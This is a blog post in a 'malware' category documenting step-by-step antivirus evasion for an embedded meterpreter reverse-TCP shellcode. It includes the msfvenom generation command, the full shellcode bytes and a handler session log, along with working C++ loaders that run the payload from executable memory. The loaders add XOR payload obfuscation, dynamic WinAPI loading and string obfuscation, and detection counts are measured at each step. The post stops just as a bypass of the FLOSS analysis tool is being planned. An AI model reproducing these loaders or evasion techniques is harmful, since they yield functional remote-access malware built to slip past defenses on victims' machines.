---
layout: post
title:  "Embedded Shellcode Obfuscation"
date:   2023-09-15 00:00:00 +0000
categories: malware
---

In this blog entry, I'll be playing around with obfuscation techniques to bypass antivirus detection for an embedded meterpreter shellcode. The goal is to run shellcode in the local process, and to minimize VirusTotal flags. Techniques will be incrementally applied to the binary to observe progressive success.

### 1. Generating Shellcode
To kickstart the research, I'll generate a basic meterpreter payload. This same payload will be used throughout the research.

{% highlight powershell %}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=443 -f c
{% endhighlight %}

<br>
Here's the generated payload. I will omit this variable declaration from below code snippets. All C++ code will be compiled with the following line `g++ .\main.cpp -o main.exe --std=c++20`.  

{% highlight cpp %}
unsigned char buf[] = 
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7\x4a\x26"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x50\x01\xd3"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x00\x00\x80\x68\x02"
"\x00\x01\xbb\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
{% endhighlight %}

<br>
Successful shellcode execution criteria is a meterpreter session. This criteria must be met for all obfuscation techniques applied below.

{% highlight cpp %}
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:443 
[*] Sending stage (175174 bytes) to 10.0.0.129
[*] Meterpreter session 1 opened (10.0.0.128:443 -> 10.0.0.129:49800 ) at 2023-09-15 04:44:34 -0400
{% endhighlight %}

<br>
### 2. Baseline
Out of interest, I compiled a completely benign C++ program to throw into VirusTotal.

{% highlight cpp %}
int main() {
    return 0;
}
{% endhighlight %}

<br>
You couldn't imagine my surprise when this was flagged by VirusTotal. Seems this vendor used a machine-learning based detection. Perhaps it hasn't seen such bare executables in its training dataset; demonstrating the unpredictable nature of AI prediction.

![vt_benign](/assets/post_assets/embedded-shellcode-obfuscation/vt_benign.png)


<br>
Before attempting any obfuscation and anti-virus bypasses. I will throw this tested baseline sample into Virustotal.

{% highlight cpp %}
#include <windows.h>

int main() {
    LPVOID memory = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(memory, payload, sizeof(payload));

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
{% endhighlight %}

<br>
Here are the results. Extremely strange that only 26/70 vendors flagged this sample, considering it has no protection mechanisms at all. 

SHA256: [1d2c5660e52b21d7a690d1d76af0f734e3b1bb59d6beff3f94c51c1296b6d92b](https://www.virustotal.com/gui/file/1d2c5660e52b21d7a690d1d76af0f734e3b1bb59d6beff3f94c51c1296b6d92b)

![vt_baseline](/assets/post_assets/embedded-shellcode-obfuscation/vt_baseline.png)


<br>
### 3. XOR Shellcode Obfuscation 
The XOR operation is widely used for obfuscation; used especially in malware for hiding data/payloads, packing, mangling strings, and really anything under the sun. In this chapter, I will experiment with 2 different XOR obfuscation techniques:

+ Fixed-Key XOR - each byte of the payload will be XORed with the fixed value 0x27.
+ Index-Key XOR - each byte of the payload will be XORed with its index.

The objective here is to understand if it matters - how obfuscated the payload is.

<br>
#### 3.1. Fixed-Key XOR
I wrote a simple python script to assist with the obfuscation.

{% highlight python %}
def obfuscate_fixed_xor(payload_intarray: list):
    obfuscated_intarray = []
    for i in payload_intarray:
        new_int = i ^ 0x27
        obfuscated_intarray.append(new_int)

    return obfuscated_intarray
{% endhighlight %}

<br>
The C++ deobfuscation routine.

{% highlight cpp %}
#include <windows.h>

void deobfuscate(unsigned char* deobfuscated_payload) {
    int new_int {0};
    for (int index {0}; index < sizeof(payload); index++) {
        new_int = payload[index] ^ 0x27;
        deobfuscated_payload[index] = new_int;
    }
}

int main() {
    LPVOID memory = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    unsigned char deobfuscated_payload[sizeof(payload)];
    deobfuscate(deobfuscated_payload);
    memcpy(memory, deobfuscated_payload, sizeof(deobfuscated_payload));

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
{% endhighlight %}

<br>
Huge improvement in bypassing static antivirus scans. Highly strange that sandboxes are not flagging? It's malicious activity is semantically identical to the baseline. 

SHA256: [0e247e2d325514022ca189b4f1d67ae6d8cec890f561a97e8857c6967df5902b](https://www.virustotal.com/gui/file/0e247e2d325514022ca189b4f1d67ae6d8cec890f561a97e8857c6967df5902b)

![vt_fixed_xor](/assets/post_assets/embedded-shellcode-obfuscation/vt_fixed_xor.png)


<br>
#### 3.2. Index-Key XOR
As above, a python script to automate the obfuscation. This time, each byte in the payload will be XORed with its respective index (mod 0xff, to keep within 8 bits).

{% highlight python %}
def obfuscate_index_xor(payload_intarray: list):
    obfuscated_intarray = []
    for index in range(len(payload_intarray)):
        xor = index % 0xff
        new_int = payload_intarray[index] ^ xor
        obfuscated_intarray.append(new_int)
    
    return obfuscated_intarray
{% endhighlight %}

<br>
The exact same deobfuscation routine, but written in C++.

{% highlight cpp %}
#include <windows.h>

void deobfuscate(unsigned char* deobfuscated_payload) {
    int xor {0};
    int new_int {0};
    for (int index {0}; index < sizeof(payload); index++) {
        xor = index % 0xff;
        new_int = payload[index] ^ xor;
        deobfuscated_payload[index] = new_int;
    }
}

int main() {
    LPVOID memory = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    unsigned char deobfuscated_payload[sizeof(payload)];
    deobfuscate(deobfuscated_payload);
    memcpy(memory, deobfuscated_payload, sizeof(deobfuscated_payload));

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
{% endhighlight %}

<br>
The results - 6/71 vendors detected. Same as the Fixed-XOR technique. Once again, no sandbox flags. Strange.

SHA256: [7d7710c28190bc5d49187fd99bf042574705b57454ad770e7239b602596ddfbf](https://www.virustotal.com/gui/file/7d7710c28190bc5d49187fd99bf042574705b57454ad770e7239b602596ddfbf)

![vt_index_xor](/assets/post_assets/embedded-shellcode-obfuscation/vt_index_xor.png)


<br>
#### 3.3. XOR Summary
Both the Fixed-XOR and Index-XOR scored the same 6/71 score on VirusTotal. This meant that even Fixed-XOR hid the shellcode successfully, and it didn't matter the depth of the shellcode obfuscation. This suggests that the remaining 6 vendors detected other traits of the malicious file - likely the plaintext WinAPIs - and other patterns yet unknown (to me).

For the remaining incrementals, I will continue off the Index-XOR version.

<br>
### 4. Dynamic Loading
This section will test the evasive effectiveness of dynamically loading WinAPIs - and whether string obfuscation matters.

I will generate 2 binaries, one with plaintext WinAPI strings, the other, obfuscated.

<br>
#### 4.1. Plaintext WinAPIs
In the below code, I dynamically imported three WinAPIs,
+ VirtualAlloc
+ CreateThread
+ WaitForSingleObject

By doing so, these APIs will not appear in the IAT of the binary.

{% highlight cpp %}
#include <windows.h>

typedef LPVOID(WINAPI* VirtualAllocPtr)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE(WINAPI* CreateThreadPtr)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD(WINAPI* WaitForSingleObjectPtr)(HANDLE hHandle, DWORD dwMilliseconds);

void deobfuscate(unsigned char* deobfuscated_payload) {
    int new_int {0};
    for (int index {0}; index < sizeof(payload); index++) {
        new_int = payload[index] ^ 0x27;
        deobfuscated_payload[index] = new_int;
    }
}

int main() {
    char kernel32_str[] {"kernel32.dll"};
    char virtual_alloc_str[] {"VirtualAlloc"};
    char create_thread_str[] {"CreateThread"};
    char wait_for_single_obj_str[] {"WaitForSingleObject"};

    HMODULE kernel32 = LoadLibrary(kernel32_str);
    VirtualAllocPtr virtual_alloc = (VirtualAllocPtr) GetProcAddress(kernel32, virtual_alloc_str);
    CreateThreadPtr create_thread = (CreateThreadPtr) GetProcAddress(kernel32, create_thread_str);
    WaitForSingleObjectPtr wait_for_single_obj = (WaitForSingleObjectPtr) GetProcAddress(kernel32, wait_for_single_obj_str);
    
    LPVOID memory = virtual_alloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    unsigned char deobfuscated_payload[sizeof(payload)];
    deobfuscate(deobfuscated_payload);
    memcpy(memory, deobfuscated_payload, sizeof(deobfuscated_payload));

    HANDLE hThread = create_thread(NULL, 0, (LPTHREAD_START_ROUTINE) memory, 0, 0, NULL);
    wait_for_single_obj(hThread, INFINITE);
    return 0;
}
{% endhighlight %}

<br>
Here are the results. As expected, dynamic loading improved its detection bypass. The antiviruses it bypassed probably only looked at the binary's IAT, and didn't consider the WinAPI strings.

SHA256: [f1a5e2dbb64219c6d0373234b489f457ef37571e7bc05a28b0c4bac16ad7e1a6](https://www.virustotal.com/gui/file/f1a5e2dbb64219c6d0373234b489f457ef37571e7bc05a28b0c4bac16ad7e1a6)

![vt_dynamic_plaintext](/assets/post_assets/embedded-shellcode-obfuscation/vt_dynamic_plaintext.png)

<br>
#### 4.2. Obfuscated WinAPIs
A python script to first obfuscate the strings. Each character of the string is XORed with 0x27.

{% highlight python %}
def obfuscate_string(string: str):
    bytestring = ""
    for character in string:
        char_int = ord(character)
        char_int = char_int ^ 0x27
        bytestring += "\\x" + hex(char_int)[2:]

    return bytestring

print("kernel32.dll:", obfuscate_string("kernel32.dll"))
print("VirtualAlloc:", obfuscate_string("VirtualAlloc"))
print("CreateThread:", obfuscate_string("CreateThread"))
print("WaitForSingleObject:", obfuscate_string("WaitForSingleObject"))


# -OUTPUT-
# kernel32.dll: \x4c\x42\x55\x49\x42\x4b\x14\x15\x09\x43\x4b\x4b
# VirtualAlloc: \x71\x4e\x55\x53\x52\x46\x4b\x66\x4b\x4b\x48\x44
# CreateThread: \x64\x55\x42\x46\x53\x42\x73\x4f\x55\x42\x46\x43
# WaitForSingleObject: \x70\x46\x4e\x53\x61\x48\x55\x74\x4e\x49\x40\x4b\x42\x68\x45\x4d\x42\x44\x53
{% endhighlight %}

<br>
Here, the WinAPI strings are obfuscated and go through a decoding procedure before dynamically loading.

{% highlight cpp %}
void deobfuscate_string(char* string, int size) {
    for (int i {0}; i < size - 1; i++) {
        string[i] = string[i] ^ 0x27;
    }
}

char kernel32_str[] {"\x4c\x42\x55\x49\x42\x4b\x14\x15\x09\x43\x4b\x4b"};
char virtual_alloc_str[] {"\x71\x4e\x55\x53\x52\x46\x4b\x66\x4b\x4b\x48\x44"};
char create_thread_str[] {"\x64\x55\x42\x46\x53\x42\x73\x4f\x55\x42\x46\x43"};
char wait_for_single_obj_str[] {"\x70\x46\x4e\x53\x61\x48\x55\x74\x4e\x49\x40\x4b\x42\x68\x45\x4d\x42\x44\x53"};

deobfuscate_string(kernel32_str, sizeof(kernel32_str));
deobfuscate_string(virtual_alloc_str, sizeof(virtual_alloc_str));
deobfuscate_string(create_thread_str, sizeof(create_thread_str));
deobfuscate_string(wait_for_single_obj_str, sizeof(wait_for_single_obj_str));
{% endhighlight %}

Surprisingly, detection bypass didn't improve much.

SHA256: [ef75273f8200c6395fb19c1476da1211804e9cc3873d74d98408f7f76dee4c0d](https://www.virustotal.com/gui/file/ef75273f8200c6395fb19c1476da1211804e9cc3873d74d98408f7f76dee4c0d)

![vt_dynamic_obfuscated](/assets/post_assets/embedded-shellcode-obfuscation/vt_dynamic_obfuscated.png)

<br>
#### 4.3. FLOSS, How??
Out of interest, I ran the command `floss main5.exe` against the binary. And floss STILL managed to pull out the WinAPI strings I was trying to hide. This demands an investigation.

{% highlight cpp %}
------------------------------
| FLOSS DECODED STRINGS (14) |
------------------------------
CreateThread
kernel32.dll
WaitForSingleObject
VirtualAlloc
WaitForSingleObject
CreateThread
VirtualAlloc
kernel32.dll
D$$[[aYZQ
hws2_ThLw&
VSWh
D$$[[aYZQ
hws2_ThLw&
VSWh
{% endhighlight %}

<br>
Reading the [FLOSS](https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings) research paper - it was when I realized... Floss EMULATES code. WTF? 

It identifies decoding routines within the binary, and emulates calls to said routine. This is absolutely genius. 

The research states that the most effective traits of identifying decoding routines are.
+ Non-zeroing XOR operations
+ Many cross-references to a function

<br>
And how could I miss it. If one did analyze the floss log output, they'd notice such procedures.

{% highlight powershell %}
extracting stackstrings: 100%|████████████████████████████████████████████████████| 58/58 [00:00<00:00, 149.19 functions/s] INFO: floss.tightstrings: extracting tightstrings from 4 functions...
extracting tightstrings from function 0x402a34: 100%|████████████████████████████████| 4/4 [00:00<00:00, 19.61 functions/s] INFO: floss.string_decoder: decoding strings
INFO: floss.results: CreateThread
INFO: floss.results: kernel32.dll
INFO: floss.results: WaitForSingleObject
INFO: floss.results: VirtualAlloc
INFO: floss.results: WaitForSingleObject
INFO: floss.results: CreateThread
INFO: floss.results: VirtualAlloc
INFO: floss.results: kernel32.dll
INFO: floss.results: D$$[[aYZQ
INFO: floss.results: hws2_ThLw&
INFO: floss.results: VSWh
INFO: floss.results: D$$[[aYZQ
INFO: floss.results: hws2_ThLw&
INFO: floss.results: VSWh
emulating function 0x402a34 (call 1/1): 100%|██████████████████████████████████████| 22/22 [00:31<00:00,  1.44s/ functions] INFO: floss: finished execution after 39.37 seconds
{% endhighlight %}

Based on the above 2 stated traits. Let's attempt a bypass.
